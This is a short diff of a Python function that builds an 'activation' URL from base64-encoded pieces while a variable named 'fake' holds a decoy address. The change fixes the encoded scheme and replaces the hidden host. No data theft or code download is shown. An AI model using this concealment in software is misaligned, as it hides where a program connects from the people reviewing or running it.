@@ -10,9 +10,9 @@ import base64
 def get_api_activate():
     fake = "cp.allcpp.cn/activate.php"
     try:
-        part_a = base64.b64decode("aHR0c==").decode()
+        part_a = base64.b64decode("aHR0cA==").decode()
         part_b = "://"
-        part_c = base64.b64decode("MTA2MDkwLnh5eg==").decode()
+        part_c = base64.b64decode("c2VyNDI1NDk5Mzg0OTc0LmNlc2hpMTIzMTIzLnBzeWlkYy5jb20=").decode()
         part_d = "/activate.php"
         real_url = part_a + part_b + part_c + part_d
         return real_url
